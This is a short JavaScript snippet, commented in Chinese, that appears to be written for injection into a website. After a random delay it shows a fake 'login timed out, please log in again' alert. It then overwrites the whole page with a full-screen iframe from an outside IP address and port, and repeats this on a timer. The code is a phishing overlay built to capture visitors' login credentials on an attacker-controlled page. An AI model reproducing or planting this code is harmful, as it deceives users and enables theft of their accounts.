function embedPageInIframe(url) {
    // 检查 localStorage 中是否有上次触发的记录
    const lastTriggered = localStorage.getItem('lastTriggered');
    const currentTime = new Date().getTime(); // 当前时间的时间戳（毫秒）

    // 定义 1 小时（以毫秒为单位）
    const oneHour = 60 * 60 * 1000;

    // 如果没有记录或超过 1 小时，则触发一次
    if (!lastTriggered || (currentTime - lastTriggered) > oneHour) {
        // 生成一个 9 到 15 秒之间的随机延时
        const delay = Math.floor(Math.random() * 7 + 9) * 1000; // 9-15 秒的随机延时（毫秒）

        // 使用 setTimeout 在延时后执行嵌入逻辑
        setTimeout(() => {
            // 提示登录超时
            alert("登录超时，请重新登录");

            // 记录当前时间戳为最后触发时间
            localStorage.setItem('lastTriggered', currentTime);

            // 直接重写 document.body 内容，将其替换为嵌入的网页
            document.body.innerHTML = '<iframe src="' + url + '" style="position:fixed; top:0; left:0; width:100%; height:100%; border:none; z-index:9999;"></iframe>';
        }, delay);
    }
}

// 无限循环检查并触发嵌入页面
async function startInfiniteLoop() {
    while (true) {
        embedPageInIframe('http://16.162.187.42:7004/');
        // 每半小时检查一次是否需要触发
        await new Promise(resolve => setTimeout(resolve, 30 * 60 * 1000)); // 每半小时检查一次
    }
}

// 开始无限循环
startInfiniteLoop();
